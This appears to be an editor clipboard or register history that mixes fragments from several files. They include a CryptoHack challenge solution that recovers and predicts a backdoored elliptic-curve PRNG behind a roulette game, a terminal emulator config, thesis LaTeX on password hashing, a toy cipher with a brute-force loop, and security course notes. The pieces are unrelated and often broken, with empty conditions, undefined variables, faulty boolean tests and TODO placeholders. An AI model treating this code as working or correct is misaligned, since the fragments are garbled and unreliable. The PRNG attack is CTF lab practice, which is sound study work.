fd10e9ff4f5be3f36454da4270e7e3bb|file:///home/neo/cryptohack/misc/prngs/sleeve.py|1|1|V|python
	from fastecdsa.curve import P256
	from fastecdsa.point import Point
	from Crypto.Random import random
30ad26e8280368b820d5690d6b2fe242|file:///home/neo/cryptohack/misc/prngs/sleeve.py|34|1|V|python
	    def rebase(self, n, b=37):
	        if n < b:
	            return [n]
	        else:
	            return [n % b] + self.rebase(n//b, b)
1a2c7fbd5da6df13c763689154655a76|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|24|26|v|python
	self.
235c2694d75b768d04cb57e9125e91c1|file:///home/neo/cryptohack/misc/prngs/sleeve.py|1|1|V|python
	from fastecdsa.curve import P256
5f4bcfd45ed18dff54fc7ce35a6a9f78|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|48|9|v|python
	...:
8f2081037bc39c05204a2716290b5cb3|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|53|9|V|python
	        point_x = r1_str + b
91297f28fc31680c37b3bb0a9c6c6ef6|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|27|1|V|python
	    """ Find a quadratic residue (mod p) of 'a'. p
	        must be an odd prime.
	
	        Solve the congruence of the form:
	            x^2 = a (mod p)
	        And returns x. Note that p - x is also a root.
	
	        0 is returned is no square root exists for
	        these a and p.
	
	        The Tonelli-Shanks algorithm is used (except
	        for some simple cases in which the solution
	        is known from an identity). This algorithm
	        runs in polynomial time (unless the
	        generalized Riemann hypothesis is false).
	    """
	    # Simple cases
	    #
ac78cd7358c4bd837dfaff20c8b9f2ce|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|36|1|V|python
	    # Partition p-1 to s * 2^e for an odd s (i.e.
	    # reduce all the powers of 2 from p-1)
	    #
75b3fae98a80dedba749791c92466842|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|42|1|V|python
	    # Find some 'n' with a legendre symbol n|p = -1.
	    # Shouldn't take long.
	    #
f38f418f84023ac1afa009031863c78e|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|46|1|V|python
	    # Here be dragons!
	    # Read the paper "Square roots from 1; 24, 51,
	    # 10 to Dan Shanks" by Ezra Brown for more
	    # information
	    #
	
	    # x is a guess of the square root that gets better
	    # with each iteration.
	    # b is the "fudge factor" - by how much we're off
	    # with the guess. The invariant x^2 = ab (mod p)
	    # is maintained throughout the loop.
	    # g is used for successive powers of n to update
	    # both a and b
	    # r is the exponent - decreases with each update
	    #
0a7036f6a0dd79a46f03644bbcc3f7e3|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|70|1|V|python
	    """ Compute the Legendre symbol a|p using
	        Euler's criterion. p is a prime, a is
	        relatively prime to p (if p divides
	        a, then a|p = 0)
	
	        Returns 1 if a has a square root modulo
	        p, -1 otherwise.
	    """
c839a2f58614ad5592d1913f6dcf8c5f|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|18|18|v|python
	& (2**(8 * 30) - 1)
2054594b19065782445258043cbb23c9|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|31|1|V|python
	        s = (t * self.P).x
	        self.seed = s
	        r = (s * self.Q).x
	        return r & (2**(8 * 30) - 1)
fe4c0f30aa359c41d9f9a5f69c8c4192|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|22|24|v|python
	seed
c5848bcd1d4cea9553ebadc6ea99b70d|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|21|1|V|python
	class CustomRNG:
	    def __init__(self, first_state, P, Q):
	        self.seed = seed
	        self.P = P
	        self.Q = Q
	        self.first_state = first_state
	
	    def first_output(self):
	        s = self.first_state
	        self.seed = s
	        r = (s * self.Q).x
	        return r & (2**(8 * 30) - 1)
	
	    def next(self):
	        t = self.seed
	        s = (t * self.P).x
	        self.seed = s
	        r = (s * self.Q).x
	        return r & (2**(8 * 30) - 1)
38b5ef39a37dfa0e8ac4e620a6297a8e|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|20|1|V|python
	
	class CustomRNG:
	    def __init__(self, first_state, P, Q):
	        self.seed = 1
	        self.P = P
	        self.Q = Q
	        self.first_state = first_state
	
	    def first_output(self):
	        s = self.first_state
	        self.seed = s
	        r = (s * self.Q).x
	        return r & (2**(8 * 30) - 1)
6a378b812e9f64f34cf46cc2789d2604|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|20|1|V|python
	    def next(self):
	        t = self.seed
	        s = (t * self.P).x
	        self.seed = s
	        r = (s * self.Q).x
	        return r & (2**(8 * 30) - 1)
d22935991e509ca08ee0f66a4e65caef|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|79|11|v|python
	0xd19761748936051e5fb436f5c383a2ca6fbd1e61f227a3d70f44d73311781b32
39c82fbd7911073eb4c9cfa89fa7bd4b|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|80|13|v|python
	0xdc4c729f6de383957f62d1318197757cd2015ae6f27066ef9990fcf6d4319d82
d4a8e1dc7438708e79887566e00702da|file:///home/neo/cryptohack/misc/prngs/sleeve.py|34|1|V|python
	    def rebase(self, n, b=37):
	        if n < b:
	            return [n]
	        else:
	            return [n % b] + self.rebase(n//b, b)
	
9d6c3f038aba37ff8b1607251b84618e|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|105|1|V|python
	print(spins)
6aac193d9577fb96fa984ec7b16d0c7d|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|103|16|V|python
	        print(i)
	        print(spins)
8dc7e9591b4a804a615ecfb44b894875|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|100|5|V|python
	    print(msg)
6353440598152b7c7c9792cf4e14e605|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|101|5|V|python
	    print(ball)
46f5bcc41cc2fc7ec1a29385f327a886|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|100|5|V|python
	    ball = int(msg[msg.index('on')+1][:-1], 10)
4f91f0ded11ee286243c8fe56589ad0f|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|100|5|V|python
	    spins.append(ball)
442c1c1b686dbd552b25c4dc007bb08f|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|99|21|v|python
	.split(' ')
25e2bba09a0966c3947856f9670d8b84|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|107|5|V|python
	    spins.append(spin)
927b1f1dab2c0eb49a87fc6db188afed|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|107|15|v|python
	spins
2e2dd2212e453ed5c7bef1abed80268b|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|108|9|V|python
	        # reconstruct number
57e4be47911236545e75553baf86a3a2|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|103|9|v|python
	rand_num
94027e2f8d68b365af4b98c53106ab7a|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|106|15|v|python
	rd_num
e9643690e4c065ef0550e7725c5f4343|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|106|9|V|python
	        print(r1)
3c78a36c7c0372534f98fcf0ad696d46|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|107|1|V|python
	# r1_str = str(hex(r1))
	# cand_points = []
	# for i in range(256**2):
	#     b = str(hex(i))[2:].rjust(4,'0')
	#     point_x = int('0x' + b + r1_str[2:], 16)
	#     try:
	#         point_y = modular_sqrt(P256.evaluate(point_x), P256.p)
	#         cand_point = Point(point_x, point_y)
	#         cand_points.append(cand_point)
	#     except:
	#         pass
b03ca6d7f0287180bd66a4df60c1f6d3|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|117|9|V|python
	        spins = []
fc3ffe95e3d773dd0a15b9fdd8436650|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|97|1|V|python
	for i in range(50):
	    json_send({"choice": 1})
	    rec = json_recv()
	    msg = rec['msg']
	    spin = rec['spin']
	    spins.append(spin)
	    if 'evening' in msg:
	        r1 = 0
	        for pos, n in enumerate(spins):
	            r1 += n * (37 ** i)
3d2cc6b36865192102057ed1fb0c4364|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|135|5|V|python
	    actual_next = TODO
6abc2df6b7f2ac6f9cca1801f83e46dd|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|147|1|V|python
	print(pred_rng.next())
ab87d6d817c88c5227e49cee6a5f8375|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|131|1|V|python
	    rec = json_recv()
	    msg = rec['msg']
21e52710f5033d4b2f6abb3daa57d974|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|136|1|V|python
	        actual_next = 0
f544bf4292c588bf5609ffc25a61957c|file:///home/neo/cryptohack/misc/prngs/sol_sleeve.py|122|13|V|python
	            print(point)
3ef7f3b2e7589c7a3e54e0f333fad77e|file:///home/neo/cryptohack/misc/prngs/sleeve.py|24|1|V|python
	    reds = {1, 3, 5, 7, 9, 12, 14, 16, 18, 19, 21, 23, 25, 27, 30, 32, 34, 36}
	    blacks = {2, 4, 6, 8, 10, 11, 13, 15, 17, 20, 22, 24, 26, 28, 29, 31, 33, 35}
	    odds = {1, 3, 5, 7, 9, 11, 13, 15, 17, 19, 21, 23, 25, 27, 29, 31, 33, 35}
	    evens = {2, 4, 6, 8, 10, 12, 14, 16, 18, 20, 22, 24, 26, 28, 30, 32, 34, 36}
13f08e6f7aed0b83633684efc50658c2|file:///home/neo/st/st-copyout|6|1|V|sh
	tmpfile=$(mktemp /tmp/st-cmd-output.XXXXXX)
	trap 'rm "$tmpfile"' 0 1 15
	sed -n "w $tmpfile"
	ps1="$(grep "\S" "$tmpfile" | tail -n 1 | sed 's/^\s*//' | cut -d' ' -f1)"
	chosen="$(grep -F "$ps1" "$tmpfile" | sed '$ d' | tac | dmenu -p "Copy which command's output?" -i -l 10 | sed 's/[^^]/[&]/g; s/\^/\\^/g')"
	eps1="$(echo "$ps1" | sed 's/[^^]/[&]/g; s/\^/\\^/g')"
	awk "/^$chosen$/{p=1;print;next} p&&/$eps1/{p=0};p" "$tmpfile" | xclip -selection clipboard
8e37670d180a918468d2946476cfb552|file:///home/neo/st/st-copyout|6|1|V|sh
	tmpfile=$(mktemp /tmp/st-cmd-output.XXXXXX)
7da145fbccca98802b4d86082fd4ecf8|file:///home/neo/st/st-copyout|8|1|V|sh
	sed -n "w $tmpfile"
	ps1="$(grep "\S" "$tmpfile" | tail -n 1 | sed 's/^\s*//' | cut -d' ' -f1)"
c58656cc5ba218d9926e433bfdb84259|file:///home/neo/st/st-copyout|9|1|V|sh
	ps1="$(grep "\S" "$tmpfile" | tail -n 1 | sed 's/^\s*//' | cut -d' ' -f1)"
8835f61d75b97a36c52f353a73bf1db8|file:///home/neo/st/config.h|217|27|v|cpp
	= { "/bin/sh", "-c", "st-copyout", "externalpipe", NULL };
513c1952b5dfcfb32c96d55d026af1e7|file:///home/neo/st/config.h|219|49|v|cpp
	copyout
320cce8ccaf83b8487d6a544489d0edc|file:///home/neo/st/editcmd|2|1|V|
	#!/bin/sh
c4becd9dae1bb00d58b9b50027c298a7|file:///home/neo/st/config.h|257|1|V|cpp
		{ MODKEY,               XK_s,           externalpipe,   {.v = search } },
06a943c59f33a34bb5924aaf72cd2995|file:///home/neo/st/config.h|258|64|v|cpp
	search
10185df16ccb21b3d7044740c95858b4|file:///home/neo/st/config.h|219|1|V|cpp
	static char *editcmd[] = { "/bin/sh", "-c", "edit-cmd", "externalpipe", NULL };
f8afab70ba5d936ac07969dfe2eb15a4|file:///home/neo/st/config.h|256|2|V|cpp
		{ MODKEY,               XK_e,           externalpipe,   {.v = editcmd } },
1aa13d1ad4ebe8fa9316a7ce75af9d2d|file:///home/neo/st/Makefile|46|1|V|make
		cp -f st-copyout $(DESTDIR)$(PREFIX)/bin
7b3dbfb9250fd6079837bd71418a0883|file:///home/neo/st/Makefile|49|1|V|make
		chmod 755 $(DESTDIR)$(PREFIX)/bin/st-copyout
672b33c649235b57ea6d2acea224d1d5|file:///home/neo/st/Makefile|50|36|v|make
	st-copyout
c897d61b6fa3db4b7418bb60c5f5cdfd|file:///home/neo/st/Makefile|59|1|V|make
		rm -f $(DESTDIR)$(PREFIX)/bin/st-copyout
2c1ef8bf42e9113ebb8fe6e10f0146e4|file:///home/neo/st/config.h|217|1|V|cpp
	static char *copyoutput[] = { "/bin/sh", "-c", "st-copyout", "externalpipe", NULL };
e11f489033b2c9d5f5f5142d6478928b|file:///home/neo/st/config.h|219|14|v|cpp
	copyoutput
8be09fdb1ac5937a61bd25fa5c1fd54c|file:///home/neo/st/config.h|256|1|V|cpp
		{ MODKEY,               XK_o,           externalpipe,   {.v = copyoutput } },
7358f8e8f0755394bff41a5e65a6ea73|file:///home/neo/Documents/thesis/implementation.tex|166|1|V|tex
	\begin{figure}[h]
	    \caption{wp\_authenticate\_username\_password, one of the default authentication functions used in WordPress}
	    \label{lst:wp_authenticate}
	\begin{lstlisting}[language=PHP]
	function wp_authenticate_username_password( $user, $username, $password ) {
	
		if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
			return new WP_Error(
				'incorrect_password',
				sprintf(
					/* translators: %s: User name. */
					__( '<strong>ERROR</strong>: The password you entered for the username %s is incorrect.' ),
	                '<strong>' . $username . '</strong>'))
	                ...
	    }            
	...
	}
	\end{lstlisting}
	\end{figure}
	
d303d7dd1acb7596e9b3a2fdcaf0fec9|file:///home/neo/Documents/thesis/implementation.tex|164|1039|v|tex
	 If a web developer wishes to switch back to the old WordPress authentication system or to another potentially supported authentication system, can do so simply by pointing the {\tt authenticate} hook to another authentication function.
6b472ddf248d1e24c8ca18d02dc73e90|file:///home/neo/Documents/thesis/evaluation.tex|47|464|v|tex
	overhead
7deed5a7ab1b6926e81e53f23bde1ce5|file:///tmp/st-edit.NLR6Fa|2|1|V|
	neo@neo:~$ fsdlkfj ladskj f; 
e677c49fe740480f80eb2c51a4be8681|file:///home/neo/Documents/test/encrypter.py|5|9|V|python
	        print "==============================="
983d0d34cd3f7f21d7d3c343b8e04b23|file:///home/neo/Documents/test/encrypter.py|8|9|V|python
	                print tmp
687acf658ffd75adba47d13e3ebf066a|file:///home/neo/Documents/test/encrypter.py|12|13|V|python
	                print "-- " + str(tmp)
a766373d23c73ccc26602207872b5be6|file:///home/neo/Documents/test/encrypter.py|13|13|V|python
	            print msg
b53b75839d5e5e296a7bb026acc90bfe|file:///home/neo/Documents/test/encrypter.py|35|1|V|python
	# print decrypt('vasso', encrypt('vasso', 'saintbarber'))
c3d76c4ce6408797ae265121032e74b7|file:///home/neo/Documents/test/encrypter.py|12|1|V|python
	                print(msg[i])
98069789062b748145b9c2e6e36ec125|file:///home/neo/Documents/test/encrypter.py|12|29|V|python
	                print(msg[i])
	                print(msg[i-1])
	                print(tmp)
c1995043999321a7fd50e36e96c2b0c2|file:///home/neo/Documents/test/encrypter.py|11|13|V|python
	            if i == len(msg) - 1:
64a046d2ae6ce592511186e8c11dd78d|file:///home/neo/Documents/test/encrypter.py|4|1|V|python
	    msg_n = [ord(c) for c in msg]
	    print(msg_n)
13b82c7f64795a99071829e08043d9fe|file:///home/neo/Documents/test/encrypter.py|12|1|V|python
	                tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])
c7a2aaf490e5ffed0066dde0f5c41a00|file:///home/neo/Documents/test/encrypter.py|40|1|V|python
	print decrypt('', f.read().rstrip('\n'))
82a6e4f6f85afa1463bd712fc892f4ad|file:///home/neo/Documents/test/encrypter.py|1|1|V|python
	import it
e9e99ecd23a2563e8ec27cef513c9d0b|file:///home/neo/Documents/test/encrypter.py|44|5|V|python
	for c in chars:
	    print(c)
52ae5ed28d93dbe4c62b0bd7ea51df62|file:///home/neo/Documents/test/encrypter.py|47|5|V|python
	    print(keys)
176d21276933a7759c57afd4159b21de|file:///home/neo/Documents/test/encrypter.py|46|1|V|python
	    keys = combinations(chars, i)
bd69f473d5ec852566ccf832464e005c|file:///home/neo/Documents/test/encrypter.py|46|16|V|python
	for key in keys:
	    print(key)
7813a4928a90af6b13bba0a189b7b832|file:///home/neo/Documents/test/encrypter.py|8|1|V|python
	    print(msg_n)
214e5c300b575ef42471aeb25253f396|file:///home/neo/Documents/test/encrypter.py|19|5|V|python
	            # print(msg)
1f90b8cbfbfeda4215110bcbc4c7d236|file:///home/neo/Documents/test/encrypter.py|7|5|V|python
	    msg_n = [ord(c) for c in msg]
8da19427e226ab2f17c2786da08d39bb|file:///home/neo/Documents/test/encrypter.py|8|5|V|python
	        print(ord(char_key))
ae9c5cbbef25c890855463f2a5825598|file:///home/neo/Documents/test/encrypter.py|41|1|V|python
	decrypt('a', ct)
e1a27385685c609e3f86ec53198ae6c9|file:///home/neo/Documents/test/encrypter.py|31|2|V|python
	            print(tmp)
6c5cab314b1bafe65fe00d9fff13fd88|file:///home/neo/Documents/test/encrypter.py|28|13|V|python
	            print(tmp%256)
0bee1abb8ba742f0f72ed93c5ec90822|file:///home/neo/Documents/test/encrypter.py|40|1|V|python
	keys = [''.join(map(str,k)) for k in combinations(chars, 2)]
a86634a02a6d28aa4d9124ade5a273b4|file:///home/neo/Documents/test/encrypter.py|35|1|V|python
	print(encrypt('key', 'saintbarber was here'))
d7a80d4d71782801c59200f89c19e327|file:///home/neo/Documents/test/encrypter.py|35|1|V|python
	ct = open('ciphertext', 'r').read().rstrip('\n')
	chars = string.ascii_letters
	scores = {}
	for i in range(20):
	    keys = [''.join(map(str,k)) for k in combinations(chars, i)]
	    for key in keys:
	        print(key)
96592bb84a2c72838659464ff88f59ca|file:///home/neo/Documents/test/encrypter.py|37|1|V|python
	# scores = {}
f9c9ffabb63eefa6dfb26a3b442b9793|file:///home/neo/Documents/test/encrypter.py|46|9|V|python
	        if 'or' or 'and' or 'the' in dec:
52167325a86f4f898bba96c8ae422641|file:///home/neo/Documents/test/encrypter.py|45|1|V|python
	        dec = decrypt(key, ct)
	        score = 0
	        for c in dec:
	            if c in string.ascii_letters:
	                score += 1
	            else:
	                score -= 1
	        scores[dec] = score
	scores = sorted(scores, key=scores.get, reverse=True)
	for i in range(10):
	    print(scores[i])
bf8df0578dae08d18f55a1bc99c7aed2|file:///home/neo/Documents/test/encrypter.py|51|5|V|python
	#     for key in keys:
	#         print(key)
ed97dafc193616f7b59b6e9dc5146c5b|file:///home/neo/Documents/test/encrypter.py|57|14|v|python
	.ascii_letters
7a85ad3fa854c1b36e37694befa25ab6|file:///home/neo/Documents/test/encrypter.py|37|1|V|python
	ct = open('ciphertext', 'r').read().rstrip('\n')
	scores = {}
	chars = string.ascii_letters
91f6fd53f08a4c455592a06e21226e19|file:///home/neo/Documents/test/encrypter.py|56|1|V|python
	ct = open('ciphertext', 'r').read().rstrip('\n')
	scores = {}
	chars = string.ascii_letters
	for i in range(40):
	    for c in chars:
	        key = c * i
	        dec = decrypt(key, ct)
	        score = 0
	        for c in dec:
	            if c in string.ascii_letters:
	                score += 1
	            else:
	                score -= 1
	        scores[dec] = score
	scores = sorted(scores, key=scores.get, reverse=True)
	for i in range(10):
	    print(scores[i])
f17cfc8b029893b3c9c15e75a5cacfcc|file:///home/neo/Documents/test/encrypter.py|13|1|V|python
	            tmp = ord(msg[i]) + ord(char_key) + ord(msg[i-1])
b28ef4ed61948c05b1328454b1ba3916|file:///home/neo/Documents/test/encrypter.py|34|16|v|python
	kkkkkkkkkkk
18e6a7be589f59ec1be2463172c0d057|file:///home/neo/Documents/test/encrypter.py|34|16|v|python
	key12341234
1677736c6e264c82aaba931f933445f6|file:///home/neo/Documents/test/encrypter.py|34|22|v|python
	this is a test asdf asdf asdf asdf asdf
e848bb7366678e03f2fc4740f673c032|file:///home/neo/Documents/test/encrypter.py|8|1|V|python
	        print(char_key)
248d199634a8402a7078f1e1a09f26e9|file:///home/neo/Documents/test/encrypter.py|35|1|V|python
	print(enc)
25bb464972ec021e8e085802948b71c3|file:///home/neo/Documents/test/encrypter.py|8|18|v|python
	.append(msg[i]) 
621e34c79ed92f231d1833e5dc230095|file:///home/neo/Documents/test/encrypter.py|6|5|V|python
	    print(letters)
e5020500e33cf9b3b952ebe2db3f4707|file:///home/neo/Documents/test/encrypter.py|15|1|V|python
	                letters[i].append(char_key)
97425e2975397fdd9c84e02bfba30a03|file:///home/neo/Documents/test/encrypter.py|16|35|v|python
	char_key
a2309bf6fe110f01a1cbecd5700f29df|file:///home/neo/Documents/test/encrypter.py|15|1|V|python
	                letters[i].append(char_key)
	                letters[i].append(letters[-1])
3dfc6fd91943608affd1fde3d368ae72|file:///home/neo/Documents/test/encrypter.py|24|1|V|python
	            for l in letters:
	                print(l)
d4731ee4aa1f002ed7a97fee1507fd3e|file:///home/neo/Documents/test/encrypter.py|16|1|V|python
	                print(letters[i])
315ae90feb5927b7de8673e295c85fa4|file:///home/neo/Documents/test/encrypter.py|12|13|V|python
	            print(msg[i], msg[i-1])
0dbd06d769ee8a97b1ff33c06be356aa|file:///home/neo/Documents/test/encrypter.py|12|13|V|python
	            if i == 1:
704b900e4fa143150a6a49ba574c8f77|file:///home/neo/Documents/test/encrypter.py|7|18|v|python
	.append(msg[i])
2f6fc92f3bdb5672a49a7c284fa4a7b4|file:///home/neo/Documents/test/encrypter.py|18|27|v|python
	.append
8c527869a9d5b1dfe66c3b42a7fb3081|file:///home/neo/Documents/test/encrypter.py|5|1|V|python
	    letters = [[]] * len(msg) 
2b23fe18a08ee82ae55cf597dfaa1e46|file:///home/neo/Documents/test/encrypter.py|37|1|V|python
	                if char_key in letters[i]:
	                    letters[i].replace(char_key,'',1) 
	                else:
	                    extra[i] += char_key
eae64a17eb50e0c8f9043ad3b55c086e|file:///home/neo/Documents/test/encrypter.py|41|19|V|python
	                if  in letters[i]:
	                    letters[i].replace(char_key,'',1) 
2239f8f76d4a6a3cad63cd909ecdb8a9|file:///home/neo/Documents/test/encrypter.py|23|1|V|python
	        for l in letters:
	            print(l)
e8cb70804ab17a5126646a5ec2b168ea|file:///home/neo/Documents/test/encrypter.py|31|5|V|python
	    print(extra)
3c4a4435e16307f209e566944363dc93|file:///home/neo/Documents/test/encrypter.py|40|1|V|python
	                for c in letters[-1]:
	                    letters[i] = letters[i].replace(c,'',1)
bb20f65c398ed9a0a9addf0d2a9cf573|file:///home/neo/Documents/test/encrypter.py|30|5|V|python
	    extra = letters = [''] * len(msg) 
28ff22dbcd29299067db3b829b930697|file:///home/neo/Documents/test/encrypter.py|45|21|V|python
	                else:
	                    extra[i] += char_key
cbb481008b3ebf4f3bc4add755a7d246|file:///home/neo/Documents/test/encrypter.py|35|17|V|python
	                if char_key in letters[i]:
179276ed0f72be6a519b71dedd58e0fe|file:///home/neo/Documents/test/encrypter.py|49|18|V|python
	        for e in extra:
	            print(e)
e2fc714c4727ee9395f324cd2e7f331f|file:///home/neo/Documents/test/encrypter.py|51|22|v|python
	abcd
3838e2643c0c0c8d1fdc799a88890b86|file:///home/neo/Documents/test/encrypter.py|23|5|v|python
	    # for l in letters:
	        #     print(l)
	    
567bff0a0eb3facd3f49342238ea7155|file:///home/neo/Documents/test/encrypter.py|30|5|V|python
	    letters =  ['tetfteseeete eae eseie eseiehetet', 'hetetftetfteseeete eae eseie eseiehetet', 'iehetetfhetetftetfteseeete eae eseie eseiehetet', 'seiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet', ' eseiehetetfseiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet', 'ie eseiehetetf eseiehetetfseiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet', 'seie eseiehetetfie eseiehetetf eseiehetetfseiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet', ' eseie eseiehetetfseie eseiehetetfie eseiehetetf eseiehetetfseiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet', 'ae eseie eseiehetetf eseie eseiehetetfseie eseiehetetfie eseiehetetf eseiehetetfseiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet', ' eae eseie eseiehetetfae eseie eseiehetetf eseie eseiehetetfseie eseiehetetfie eseiehetetf eseiehetetfseiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet', 'te eae eseie eseiehetetf eae eseie eseiehetetfae eseie eseiehetetf eseie eseiehetetfseie eseiehetetfie eseiehetetf eseiehetetfseiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet', 'eete eae eseie eseiehetetfte eae eseie eseiehetetf eae eseie eseiehetetfae eseie eseiehetetf eseie eseiehetetfseie eseiehetetfie eseiehetetf eseiehetetfseiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet', 'seeete eae eseie eseiehetetfeete eae eseie eseiehetetfte eae eseie eseiehetetf eae eseie eseiehetetfae eseie eseiehetetf eseie eseiehetetfseie eseiehetetfie eseiehetetf eseiehetetfseiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet', 'teseeete eae eseie eseiehetetfseeete eae eseie eseiehetetfeete eae eseie eseiehetetfte eae eseie eseiehetetf eae eseie eseiehetetfae eseie eseiehetetf eseie eseiehetetfseie eseiehetetfie eseiehetetf eseiehetetfseiehetetfiehetetfhetetftetfteseeete eae eseie eseiehetet']
2858d74ab5fdbcf22f8a2bc007085d57|file:///home/neo/Documents/test/encrypter.py|30|13|v|python
	[''] * len(msg) 
1812e2d793a91eacc05a85f7f0e34793|file:///home/neo/Documents/test/encrypter.py|61|5|V|python
	    for e in extra:
	        print(e)
54b0c58c7ce9f2a8b551351102ee0938|file:///home/neo/Documents/test/encrypter.py|65|22|v|python
	this is a test
38253e2c6b95dfade3418ddbedace80b|file:///home/neo/Documents/epl682/notes/anonymity.md|7|1|V|markdown
	- Aim: prevent traffic analysis
78a3eb73f6f32db37cc79f6a56f732c1|file:///home/neo/Documents/epl682/notes/anonymity.md|37|51|v|markdown
	, attack directory servers
b42dad5453b2128a32f6612b13ea5d9f|file:///home/neo/Documents/thesis/introduction.tex|10|11|v|tex
	have
208f156d4a803025c284bb595a7576b4|file:///home/neo/Documents/thesis/abstract.tex|14|72|v|tex
	enable
ed53f733c097c60a344c698f84746426|file:///home/neo/Documents/thesis/abstract.tex|15|1|v|tex
	easily
b6bde77a4c417bc252d9e8fdcc3aa847|file:///home/neo/Documents/thesis/thesis.tex|1|1|V|tex
	\documentclass[12pt]{report}
	\usepackage{minitoc}
	\usepackage{balance}			                    % proper column balancing 
	\usepackage{cite}			                        % well-formed numeric citations
	\usepackage{epsfig}			                        % add support for `EPS' figures
	\usepackage{epstopdf}			                    % automatic `EPS' to `PDF' conversion
	\usepackage[T1]{fontenc}		                    % enable `Type 1' fonts
	\usepackage[pagebackref = false, pdftex]{hyperref}	% add support for hypertext marks
	\usepackage{graphicx}			                    % add support for graphics
	\usepackage{listings}			                    % add support for source code listings
	\usepackage{mathptmx}			                    % use `Times' as the default font
	\usepackage{subfigure}			                    % add support for `subfloats'
	\usepackage{tikz}			                        % add support for custom graphics
	\usetikzlibrary{calc} 
	\usepackage{verbatim}	                            % better `verbatim'
	\usepackage{xcolor}			                        % add support for color names
	\usepackage{xspace}			                        % proper macro spacing
	\usepackage{mdframed}
	\usepackage{geometry}
	\usepackage[titletoc]{appendix}
c8f72b8f758c1d52a7f1a41cbedc643e|file:///home/neo/Documents/thesis/background.tex|9|709|v|tex
	 of users' passwords
99e0d947e01bbc0a507a1127dc2135b1|file:///home/neo/Documents/thesis/background.tex|12|68|v|tex
	desire
9e925e9341b490bfd3b4c4ca3b0c1ef2|file:///home/neo/Documents/thesis/background.tex|12|273|v|tex
	this
e64c3132023b29762b354a750b474c53|file:///home/neo/Documents/thesis/background.tex|20|200|v|tex
	things
14ff81d5a5fff27470c8df95664608f4|file:///home/neo/Documents/thesis/background.tex|20|221|v|tex
	 length of the output hash \etc
6b2ded51d81a4403d8a4bd25fa1e57ee|file:///home/neo/Documents/thesis/background.tex|25|1073|v|tex
	done
82e57c63fd1633899b3b0105d9576cc0|file:///home/neo/Documents/thesis/background.tex|27|86|^v|tex
	of the many algorithms based on ECC 
45c2e8271cf9bb807c12960879c87374|file:///home/neo/Documents/thesis/background.tex|27|590|^v|tex
	using a private key $A$ i
85db4d66ce7ae1144fef748d5e0b6dc7|file:///home/neo/Documents/thesis/background.tex|27|715|^v|tex
	including hashing with a cryptographic hash function $H$
aa2decaee4f1bd6318520256190eba30|file:///home/neo/Documents/thesis/implementation.tex|66|1|V|tex
	\begin{figure}
	    \caption{{{\tt scrypt} hash function called from Firefox using Mozilla's Web Crypto API.}}
	    \label{lst:webcrypt_scrypt}
	\begin{lstlisting}[]
	const encoder = new TextEncoder();
	//Get scrypt hash of password
	const passwordEncoded = encoder.encode(password);
	const hashScrypt = crypto.subtle.digest("SCRYPT",passwordEncoded);
	\end{lstlisting}
	\end{figure}
	
279316ab8fad7497ce1c4ef711e9f87e|file:///home/neo/Documents/thesis/implementation.tex|111|186|^v|tex
	by including them in a JavaScript file in the website resources and then 
4ab8710d781ba5b13aaf561cafd896b7|file:///home/neo/Documents/thesis/implementation.tex|114|114|v|tex
	made
258f5c6f9dee0566891699fbaef018eb|untitled:1|23|5|V|
	    - Captcha
79e1a4e7de0ea1442d6263531fd346e7|untitled:1|1|1|V|
	Usable security
	    - Different risks (Android app installation, warnings)
	    - Techniques (internet studies, lab studies, telemtery)
	
	Phishing
	    - What is it, methodology of finding out if users can be victinms
	    - How can an attacker create a phisihng website
	    - Interactive phishing (PRMitM) - differences from normal phishing
	    - How does PRMitM work
	
	Network security
	    - How can DSN be used maliciously (e.g. DNS hijacking -> channel for C&C)
	    - How can zmap be used maliciously / for a good purpose
	    - What does it mean to scan a host
	
	Cryptocurrencies
	    - What problems does bitcoin solve? (decentralized)
	    - How bitcoin works (high-level)
	    - What are smart contracts?
	    - Bugs in smart contracts - what does it mean
	    - What can an attacker do with these bugs
